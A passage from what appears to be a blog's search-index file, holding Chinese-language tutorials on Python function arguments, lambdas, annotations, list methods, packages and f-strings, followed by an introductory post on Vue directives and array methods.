punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> c<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><h3 id="关键字参数"><a href="#关键字参数" class="headerlink" title="关键字参数"></a>关键字参数</h3><h4 id="args-和-kwargs"><a href="#args-和-kwargs" class="headerlink" title="args 和 *kwargs"></a><em>args 和 *</em>kwargs</h4><p>首先我们需要关注在这个*上面，其实你可以理解它是有两部分的。</p><ul><li>打包</li><li>拆包</li></ul><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">argument</span><span class="token punctuation">(</span><span class="token operator">*</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">)</span>argument<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">56</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">$ python arg.py<span class="token punctuation">(</span>1, 2, 3, 4, 56<span class="token punctuation">)</span><span class="token operator">&lt;</span>class <span class="token string">'tuple'</span><span class="token operator">></span></code></pre><p>∗把函数argument接受到的多个参数1,2,3,4,56，打包成了元组(1,2,3,4,56)，赋值给了形参arg。</p><p>根据上面我们就更好理解**kwargs了。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">keywords</span><span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> kw <span class="token keyword">in</span> kwargs<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>kw<span class="token punctuation">,</span>kwargs<span class="token punctuation">[</span>kw<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>type<span class="token punctuation">(</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">)</span>keywords<span class="token punctuation">(</span>a<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>c<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">$ python kwargs.pya 1b 2c 3<span class="token operator">&lt;</span>class <span class="token string">'dict'</span><span class="token operator">></span></code></pre><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">keywords</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">,</span>c<span class="token punctuation">)</span>keywords<span class="token punctuation">(</span><span class="token operator">**</span><span class="token punctuation">{</span><span class="token string">"a"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">"b"</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">"c"</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">$ python kwargs.py1 2 3</code></pre><p><strong>这样就是把字典拆分赋值给形参了。</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">cheeseshop</span><span class="token punctuation">(</span>kind<span class="token punctuation">,</span><span class="token operator">*</span>argument<span class="token punctuation">,</span><span class="token operator">**</span>keywords<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-- Do you have any"</span><span class="token punctuation">,</span> kind<span class="token punctuation">,</span> <span class="token string">"?"</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-- I'm sorry, we're all out of"</span><span class="token punctuation">,</span> kind<span class="token punctuation">)</span>    <span class="token keyword">for</span> arg <span class="token keyword">in</span> argument<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">40</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> kw <span class="token keyword">in</span> keywords<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>kw<span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span>keywords<span class="token punctuation">[</span>kw<span class="token punctuation">]</span><span class="token punctuation">)</span>cheeseshop<span class="token punctuation">(</span><span class="token string">"Limburger"</span><span class="token punctuation">,</span> <span class="token string">"It's very runny, sir."</span><span class="token punctuation">,</span>           <span class="token string">"It's really very, VERY runny, sir."</span><span class="token punctuation">,</span>           shopkeeper<span class="token operator">=</span><span class="token string">"Michael Palin"</span><span class="token punctuation">,</span>           client<span class="token operator">=</span><span class="token string">"John Cleese"</span><span class="token punctuation">,</span>           sketch<span class="token operator">=</span><span class="token string">"Cheese Shop Sketch"</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">$ python moreval.py-- Do you have any Limburger ?-- I<span class="token string">'m sorry, we'</span>re all out of LimburgerIt<span class="token string">'s very runny, sir.It'</span>s really very, VERY runny, sir.----------------------------------------shopkeeper <span class="token keyword">:</span> Michael Palinclient <span class="token keyword">:</span> John Cleesesketch <span class="token keyword">:</span> Cheese Shop Sketch</code></pre><h3 id="Lambda表达式"><a href="#Lambda表达式" class="headerlink" title="Lambda表达式"></a>Lambda表达式</h3><p><strong>可以用lambda关键字来创建一个小的匿名函数。Lambda函数可以在需要的函数对象的任何地方使用。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> add <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y <span class="token punctuation">:</span> x<span class="token operator">+</span>y<span class="token operator">>></span><span class="token operator">></span> add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token number">3</span></code></pre><h4 id="应用在函数式编程中"><a href="#应用在函数式编程中" class="headerlink" title="应用在函数式编程中"></a>应用在函数式编程中</h4><p><strong>按照绝对值进行排序</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> list <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> sorted<span class="token punctuation">(</span>list<span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> abs<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span></code></pre><h4 id="应用在闭包中"><a href="#应用在闭包中" class="headerlink" title="应用在闭包中"></a>应用在闭包中</h4><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">def</span> <span class="token function">get_y</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> a<span class="token operator">+</span>b<span class="token operator">>></span><span class="token operator">></span> y1 <span class="token operator">=</span> get_y<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> y1<span class="token operator">&lt;</span>function get_y<span class="token punctuation">.</span><span class="token operator">&lt;</span>locals<span class="token operator">></span><span class="token punctuation">.</span><span class="token operator">&lt;</span><span class="token keyword">lambda</span><span class="token operator">></span> at <span class="token number">0x02DB80C0</span><span class="token operator">></span><span class="token operator">>></span><span class="token operator">></span> y1<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token number">2</span><span class="token operator">>></span><span class="token operator">></span> y1<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token number">2</span></code></pre><h3 id="函数标注"><a href="#函数标注" class="headerlink" title="函数标注"></a>函数标注</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">label</span><span class="token punctuation">(</span>ham<span class="token punctuation">:</span> str<span class="token punctuation">,</span>eggs<span class="token punctuation">:</span> str <span class="token operator">=</span> <span class="token string">'eggs'</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> str<span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Annotations:"</span><span class="token punctuation">,</span> label<span class="token punctuation">.</span>__annotations__<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Arguments:"</span><span class="token punctuation">,</span> ham<span class="token punctuation">,</span> eggs<span class="token punctuation">)</span>    <span class="token keyword">return</span> ham <span class="token operator">+</span> <span class="token string">' and '</span> <span class="token operator">+</span> eggslabel<span class="token punctuation">(</span><span class="token string">'spam'</span><span class="token punctuation">)</span></code></pre><pre class=" language-bash"><code class="language-bash">$ python label.pyAnnotations: <span class="token punctuation">{</span><span class="token string">'ham'</span><span class="token keyword">:</span> <span class="token operator">&lt;</span>class <span class="token string">'str'</span><span class="token operator">></span>, <span class="token string">'eggs'</span><span class="token keyword">:</span> <span class="token operator">&lt;</span>class <span class="token string">'str'</span><span class="token operator">></span>, <span class="token string">'return'</span><span class="token keyword">:</span> <span class="token operator">&lt;</span>class <span class="token string">'str'</span><span class="token operator">></span><span class="token punctuation">}</span>Arguments: spam eggs</code></pre><p><strong>标注函数一字典的形式存放在函数的__annotations__属性中,并不会影响函数的任何其他部分。</strong></p><p><strong>形参标注的定义方式是在形参名称后面加冒号，后面跟个表达式，该表达式会被请求为标注的值。返回值标注的定义形式是加上一个组合符号-&gt;，后面跟一个表达式，该标注位于形参列表和表示def语句结束的冒号之间。</strong></p><h3 id="列表的更多特性"><a href="#列表的更多特性" class="headerlink" title="列表的更多特性"></a>列表的更多特性</h3><ul><li><p><strong>list.append(x)</strong></p><p><strong>在列表的末尾添加一个元素。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> a <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span></code></pre></li></ul><ul><li><p><strong>list.extend(iterable)</strong></p><p><strong>使用可迭代对象中的所有元素来扩展列表。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> aList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'xyz'</span><span class="token punctuation">,</span> <span class="token string">'zara'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token operator">>></span><span class="token operator">></span> bList <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2009</span><span class="token punctuation">,</span> <span class="token string">'manni'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">.</span>extend<span class="token punctuation">(</span>bList<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>aList<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'xyz'</span><span class="token punctuation">,</span> <span class="token string">'zara'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">2009</span><span class="token punctuation">,</span> <span class="token string">'manni'</span><span class="token punctuation">]</span></code></pre></li></ul><ul><li><p><strong>list.insert(i,x)</strong></p><p><strong>在给定的位置插入一个元素。第一个参数是要插入的元素的索引。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"first"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token string">'xyz'</span><span class="token punctuation">,</span> <span class="token string">'zara'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">2009</span><span class="token punctuation">,</span> <span class="token string">'manni'</span><span class="token punctuation">]</span></code></pre></li></ul><ul><li><p><strong>lsit.remove(x)</strong></p><p><strong>移除列表第一个值为x的元素。如果没有这样的元素，则抛出ValueError异常。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>Traceback <span class="token punctuation">(</span>most recent call last<span class="token punctuation">)</span><span class="token punctuation">:</span>  File <span class="token string">"&lt;pyshell#78>"</span><span class="token punctuation">,</span> line <span class="token number">1</span><span class="token punctuation">,</span> <span class="token keyword">in</span> <span class="token operator">&lt;</span>module<span class="token operator">></span>    aList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span>ValueError<span class="token punctuation">:</span> list<span class="token punctuation">.</span>remove<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span> x <span class="token operator">not</span> <span class="token keyword">in</span> list<span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">.</span>remove<span class="token punctuation">(</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'xyz'</span><span class="token punctuation">,</span> <span class="token string">'zara'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">2009</span><span class="token punctuation">,</span> <span class="token string">'manni'</span><span class="token punctuation">]</span></code></pre></li></ul><ul><li><p><strong>list.pop([i])</strong></p><p><strong>删除列表中给定位置的元素并返回它。如果没有给定位置，pop()将会删除并返回列表中的最后一个元素。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'xyz'</span><span class="token punctuation">,</span> <span class="token string">'zara'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">2009</span><span class="token punctuation">,</span> <span class="token string">'manni'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token string">'xyz'</span><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'manni'</span><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'zara'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">2009</span><span class="token punctuation">]</span></code></pre></li></ul><ul><li><p><strong>list.clear()</strong></p><p><strong>删除列表中所有的元素。</strong></p></li></ul><ul><li><p><strong>list.index(start,end)</strong></p><p><strong>返回列表中第一个值为x的元素的从零开始索引。如果没有这样的元素将会抛出异常。</strong></p><p><strong>可选参数start和end是切片符合，用于将搜索限制为列表的特定子序列。返回的所有是相对于整个序列的开始计算的，而不是start参数。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">[</span><span class="token string">'first'</span><span class="token punctuation">,</span> <span class="token string">'zara'</span><span class="token punctuation">,</span> <span class="token string">'abc'</span><span class="token punctuation">,</span> <span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">2009</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> aList<span class="token punctuation">.</span>index<span class="token punctuation">(</span><span class="token string">'first'</span><span class="token punctuation">)</span><span class="token number">0</span></code></pre></li></ul><ul><li><p><strong>list.count(x)</strong></p><p><strong>返回元素x在列表中出现的次数</strong></p></li></ul><ul><li><p><strong>list.sort(key=None,reverse=False)</strong></p><p><strong>对列表中的元素进行排序</strong></p></li></ul><ul><li><p><strong>list.reverse()</strong></p><p><strong>反转列表中的元素</strong></p></li></ul><ul><li><p><strong>list.copy()</strong></p><p><strong>返回列表的一个浅拷贝。</strong></p></li></ul><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><pre class=" language-python"><code class="language-python">sound<span class="token operator">/</span>                          Top<span class="token operator">-</span>level package      __init__<span class="token punctuation">.</span>py               Initialize the sound package      formats<span class="token operator">/</span>                  Subpackage <span class="token keyword">for</span> file format conversions              __init__<span class="token punctuation">.</span>py              wavread<span class="token punctuation">.</span>py              wavwrite<span class="token punctuation">.</span>py              aiffread<span class="token punctuation">.</span>py              aiffwrite<span class="token punctuation">.</span>py              auread<span class="token punctuation">.</span>py              auwrite<span class="token punctuation">.</span>py              <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      effects<span class="token operator">/</span>                  Subpackage <span class="token keyword">for</span> sound effects              __init__<span class="token punctuation">.</span>py              echo<span class="token punctuation">.</span>py              surround<span class="token punctuation">.</span>py              reverse<span class="token punctuation">.</span>py              <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>      filters<span class="token operator">/</span>                  Subpackage <span class="token keyword">for</span> filters              __init__<span class="token punctuation">.</span>py              equalizer<span class="token punctuation">.</span>py              vocoder<span class="token punctuation">.</span>py              karaoke<span class="token punctuation">.</span>py</code></pre><p><strong>你会发现上面的目录下都有一个一样的文件，_<em>init_</em>.py</strong></p><p><strong>因为必须要有这个文件才能让python将包含该文件的目录当做包。</strong></p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> sound<span class="token punctuation">.</span>effects<span class="token punctuation">.</span>echo</code></pre><p><strong>我们必须要把全名导入，不然无法使用这个包。这样会不会觉得很麻烦，每次都要一个一个的导入，多了就很费时间。</strong></p><p>当我们想要导入effect目录下所有的包怎么办？</p><p>我们将effect目录下的_<em>init_</em>.py文件进行修改</p><pre class=" language-python"><code class="language-python">__all__ <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"echo"</span><span class="token punctuation">,</span><span class="token string">"surround"</span><span class="token punctuation">,</span><span class="token string">"reverse"</span><span class="token punctuation">]</span></code></pre><p>当我们需要导入包时只需要：</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> sound<span class="token punctuation">.</span>effects <span class="token keyword">import</span> <span class="token operator">*</span> </code></pre><h3 id="输入输出"><a href="#输入输出" class="headerlink" title="输入输出"></a>输入输出</h3><h4 id="格式化字符串文字"><a href="#格式化字符串文字" class="headerlink" title="格式化字符串文字"></a>格式化字符串文字</h4><blockquote><p><a href="https://docs.python.org/zh-cn/3/reference/lexical_analysis.html#f-strings" target="_blank" rel="noopener">格式化字符串字面值</a> （常简称为 f-字符串）能让你在字符串前加上 <code>f</code> 和 <code>F</code> 并将表达式写成 <code>{expression}</code> 来在字符串中包含 Python 表达式的值。</p></blockquote><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> math<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'The value of pi is approximately {math.pi:.3f}.'</span><span class="token punctuation">)</span>The value of pi <span class="token keyword">is</span> approximately <span class="token number">3.142</span><span class="token punctuation">.</span></code></pre><p><strong>在‘：’后传递一个整数可以让该字段成为最小字符宽度。</strong></p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> table <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Sjoerd'</span><span class="token punctuation">:</span> <span class="token number">4127</span><span class="token punctuation">,</span> <span class="token string">'Jack'</span><span class="token punctuation">:</span> <span class="token number">4098</span><span class="token punctuation">,</span> <span class="token string">'Dcab'</span><span class="token punctuation">:</span> <span class="token number">7678</span><span class="token punctuation">}</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> name<span class="token punctuation">,</span>phone <span class="token keyword">in</span> table<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token string">'{name:10} ==> {phone:10}'</span><span class="token punctuation">)</span>Sjoerd     <span class="token operator">==</span><span class="token operator">></span>       <span class="token number">4127</span>Jack       <span class="token operator">==</span><span class="token operator">></span>       <span class="token number">4098</span>Dcab       <span class="token operator">==</span><span class="token operator">></span>       <span class="token number">7678</span></code></pre><p><strong>其他的修饰符可用于在格式转化之前转化值。’!a’应用ascii(),’!s’应用str(),还有’!r’应用repr()</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vue初识</title>
      <link href="/2019/06/17/vue-chu-shi/"/>
      <url>/2019/06/17/vue-chu-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="Vue初识"><a href="#Vue初识" class="headerlink" title="Vue初识"></a>Vue初识</h1><h2 id="基本指令"><a href="#基本指令" class="headerlink" title="基本指令"></a>基本指令</h2><h3 id="v-cloak"><a href="#v-cloak" class="headerlink" title="v-cloak"></a>v-cloak</h3><blockquote><h4 id="在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display-none-配合使用。"><a href="#在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display-none-配合使用。" class="headerlink" title="在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display:none 配合使用。"></a>在Vue实例结束编译时从绑定的HTML元素上移除，经常和CSS的display:none 配合使用。</h4></blockquote><pre class=" language-vue"><code class="language-vue"><div id = 'app' v-cloak>    {{message}}</div><script>    var app = new Vue({        el: '#app',        data: {            message: "this is message"        }    })</script></code></pre><p><strong>当我们加载程序的时候，如果遇见网上较慢情况，我们将会看到，所以我们需要结合CSS来让它不显示。</strong></p><pre class=" language-html"><code class="language-html">[v-cloak] {    dispaly: none;}</code></pre><h3 id="v-once"><a href="#v-once" class="headerlink" title="v-once"></a>v-once</h3><blockquote><h4 id="定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。"><a href="#定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。" class="headerlink" title="定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。"></a>定义它的元素或组件只能渲染一次，包括元素或所有组件的字节点。渲染后将不再渲染，视为静态文件。</h4></blockquote><pre class=" language-vue"><code class="language-vue"><div id="app">        <span v-once>{{message}}</span>        <div v-once>            <span> {{ message }} </span>        </div>    </div>    <script>        var app = new Vue({            el: '#app',            data: {                message: "this is message"            }        })    </script></code></pre><h3 id="v-if-v-else-if-v-else"><a href="#v-if-v-else-if-v-else" class="headerlink" title="v-if,v-else-if,v-else"></a>v-if,v-else-if,v-else</h3><pre class=" language-vue"><code class="language-vue">    <div id="app">        <template v-if="type === 'name'">            <label for="">用户名：</label>            <input type="text" key="name-input">        </template>        <template v-else>            <label for="">邮箱名：</label>            <input type="text" key="mail-input">        </template>        <button @click="buttonclick">切换类型</button>    </div><script>    var app = new Vue({        el: '#app',        data: {            type: 'name'        },        methods: {            buttonclick: function () {                this.type = this.type === 'name' ? 'mail' : 'name' ;            }        }    })</script></code></pre><h3 id="v-show"><a href="#v-show" class="headerlink" title="v-show"></a>v-show</h3><blockquote><h4 id="v-show就是改变CSS的display"><a href="#v-show就是改变CSS的display" class="headerlink" title="v-show就是改变CSS的display"></a>v-show就是改变CSS的display</h4></blockquote><pre class=" language-vue"><code class="language-vue">    <div id="app">        <h1 v-show="show">            this is titile        </h1>    </div><script>    var app = new  Vue({        el: '#app',        data: {            show: false        }    })</script></code></pre><h3 id="v-for"><a href="#v-for" class="headerlink" title="v-for"></a>v-for</h3><blockquote><h4 id="顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容"><a href="#顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容" class="headerlink" title="顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容"></a>顾名思义就是当我们获得到一个List或者数组进行for循环获得具体内容</h4></blockquote><pre class=" language-vue"><code class="language-vue"><body>    <div id="app">        <ul>            <li v-for="(book,index) in books">{{index}} - {{book.name}}</li>        </ul>        <ul>            <template v-for="book in books">                <li>书名：{{book.name}}</li>                <li>作者:{{book.author}}</li>            </template>        </ul>        <span v-for="u in user">            {{u}}        </span>    </div><script>    var app = new Vue({        el: '#app',        data: {            books: [                {                    name: '《Vue 实战》',                    author: 'kalifun'                },                {                    name: '《Linux 就该这么学》',                    author: 'kali'                }            ],            user: {                name: 'kali',                age: 23,                language: 'python'            }        }    })</script></body></code></pre><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>0 - 《Vue 实战》<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>1 - 《Linux 就该这么学》<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>书名：《Vue 实战》<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>作者:kalifun<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>书名：《Linux 就该这么学》<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">></span></span>作者:kali<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>kali 23 python</code></pre><h4 id="数组更新"><a href="#数组更新" class="headerlink" title="数组更新"></a>数组更新</h4><h5 id="变异方法"><a href="#变异方法" class="headerlink" title="变异方法"></a>变异方法</h5><p><strong>Vue的核心是数据和视图双向绑定的，当我们更新了数据，视图也会自动更新。</strong></p><ul><li><p><strong>push</strong></p><pre class=" language-html"><code class="language-html">app.books.push({name:'《CSS》',author:'kali'});</code></pre></li><li><p><strong>pop()</strong></p><pre><code>app.books.pop();//删除最后一组元素</code></pre></li><li><p><strong>shift()</strong></p><pre><code>app.books.shift();//把数组的第一个元素从其中删除</code></pre></li><li><p><strong>unshift()</strong></p><pre><code>app.books.unshift({name:&#39;《CSS》&#39;,author:&#39;kali&#39;});//在数组的开始添加新的元素</code></pre></li><li><p><strong>splice()</strong></p><pre><code>从数组中添加/删除项目，然后返回被删除的项目。</code></pre></li><li><p><strong>sort()</strong> </p><pre><code>app.books.sort();//返回数组排序后的结果</code></pre></li><li><p><strong>reverse()</strong></p><pre><code>app.books.reverse();//用于点到数组中元素的顺序</code></pre></li></ul><h5 id="替换数组"><a href="#替换数组" class="headerlink" title="替换数组"></a>替换数组</h5><ul><li><p><strong>filter()</strong></p><pre><code>创建一个新的数组，新数组中的元素是通过检查指定数组中符合条件的所有元素。</code></pre></li><li><p><strong>concat()</strong></p><pre><code>用于连接两个或多个数组。</code></pre></li><li><p><strong>slice()</strong></p><pre><code> 方法可从已有的数组中返回选定的元素。</code></pre></li></ul><h3 